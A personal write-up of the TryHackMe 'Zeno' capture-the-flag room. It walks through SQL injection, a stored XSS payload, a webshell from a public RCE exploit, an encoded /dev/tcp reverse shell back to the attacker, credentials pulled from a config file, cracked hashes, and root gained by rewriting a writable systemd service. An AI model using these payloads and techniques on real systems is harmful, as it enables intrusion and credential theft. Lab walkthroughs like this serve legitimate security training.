---
title: "Zeno Thm Writeup Abusing Service File Misconfigurations"
date: 2021-10-25T20:32:44+05:30
draft: false
---

Hello all, today we be doing [Zeno](https://tryhackme.com/room/zeno) from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”

# Port scanning

There was some problem with nmap and because of that it wasn’t able to show all the open ports. [Rushi](https://iamrushi.cf/) suggested to me that I use Rustscan. Thanks Rushi :D

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-0.png)

Found few more ports. So now I redid the nmap scan on these ports:

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-1.png)

We have a web server on port 12340. Let’s check that.

# The web server

After some directory busting with different wordlists, I found these to be of interest:
```py
/index.html (Status: 200)  
/rms (Status: 301)
```
`/index.html` does not return anything useful. `/rms` is Restaurant Management System. After exploring the website with burp proxy turned on in the background, I have found a few parameterized requests. We can do SQLi in the delete order query: `http://10.10.200.163:12340/rms/delete-order.php?id=0' or 1-- -`

# sqlmap

We have time based SQLi. After some time running sqlmap, here is what I have gathered:

-   Database Name: dbrms
-   Found some tables:

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-2.png)

I couldn’t find anything useful from the database. And it takes a lot of time. So let’s see if there’s other vulnerabilities. The website displays the username(first-name). I tried checking for XSS and SSTI. I could not find SSTI but found that it has stored XSS. Set the payload to `${{4*4}}<img src=x onerror=alert(1)>` to check for both XSS and SSTI at the same time.

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-3.png)

Stored XSS. Can we steal cookies?

Let’s see if we can steal the cookies of other users. Create a new account and upload a cookie stealer payload in the first name field.

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-4.png)

I used burp repeater for this

Now I logged in with this account and, did some actions on the website (such as sending reviews, buying things, etc) in hopes of getting a hit by other users so that I can grab their cookies. But I could not get any hits even after waiting for a few minutes. So its safe to say that its a dead end. Let’s check for other exploits.

# Searching for exploits

I searched for Restaurant Management System exploits in searchsploit.

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-5.png)

There is an RCE exploit available. After running it, we get a webshell uploaded at `http://ip:12340/rms/images/reverse-shell.php`. Use the `?cmd= command` for command execution.

Use this payload in URL encoded form:  
`echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash`

This will run the following reverse shell:
```sh
/bin/sh -i >& /dev/tcp/10.14.14.78/80 0>&1
```
I used Burp Decoder to url encode the payload. The final payload is:
```sh
%65%63%68%6f%20%4c%32%4a%70%62%69%39%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4e%43%34%78%4e%43%34%33%4f%43%38%34%4d%43%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68
```

Run a listener on port 80 on your attacker machine and execute the payload.

# Got a shell. Now what?

After getting a shell, I found a config file `/var/www/html/rms/connection/config.php` that contains passwords.
```bash
bash-4.2$ pwd  
/var/www/html/rms/connection  
bash-4.2$ cat config.php   
<?php  
    define('DB_HOST', 'localhost');  
    define('DB_USER', 'root');  
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');  
    define('DB_DATABASE', 'dbrms');  
    define('APP_NAME', 'Pathfinder Hotel');  
    error_reporting(1);  
?>
```
# Mysql database enumeration

In the database, there is a table named `members`. It contains some password hashes and answer hashes. I cracked a few of them except for that of user `edward` . Funnily enough, there’s a system user named edward as well.

Here are the cracked hashes and passwords:

| Username | Email | Password | Security Answer
|--|--|--|--|
| Stephen | omolewastephen@gmail.com | 1234 | deborah |
| john | jsmith@sample.com | jsmith123 | middlename |
| edward | edward@zeno.com | COULD NOT CRACK | COULD NOT CRACK |

I tried these passwords on edward’s account but couldn’t login.

# LinPEAS

Now let’s run [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). LinPEAS is a script for automated enumeration. It can help you identify running services, files, credentials, or any vulnerabilities.

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-6.png)

We have write privileges on `/etc/systemd/system/zeno-monitoring.service` Also found new creds.
```
username=**zeno**,password=**FrobjoodAdkoonceanJa**
```
Tried `sudo -l`as current user with this password but it did not work. Let's try editing the service file for now.

# Service file misconfiguration to root

Let’s add the SUID bit on `/bin/bash` for an easy privesc. Change the ExecStart to the following as shown below:
```ini
ExecStart=/usr/bin/chmod +x /bin/bash
```
![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-7.png)

We only need to change the ExecStart command. This command defines what will get executed by the service.

Now when this service starts again, we will have a SUID `/bin/bash`. We can make that happen if we can somehow restart it. But we don't have permissions to do that as a low privileged user. Another way to make it happen is if we can somehow reboot the system. I tried to reboot the system but couldn't. We need root privileges to reboot.

Let’s try the password found earlier (`FrobjoodAdkoonceanJa`) on user `edward`. We can successfully login as edward 🎉.

Checking for `sudo -l` permissions on edward, we see that he can reboot the system.

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-8.png)

User edward can reboot the system

Reboot the machine with `sudo /usr/sbin/reboot` and now when the system is fully rebooted, login as edward through ssh. As the system reboots, our service will also startup. We will now have a SUID `/bin/bash`. Use it to escalate privileges to **root**

![](/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-9.png)

Rooted :p

Zeno is now rooted✨

I hope it was easy to follow through. Until next time.  
Take care :)

Find me on twitter: [@manash036](https://twitter.com/manash036)
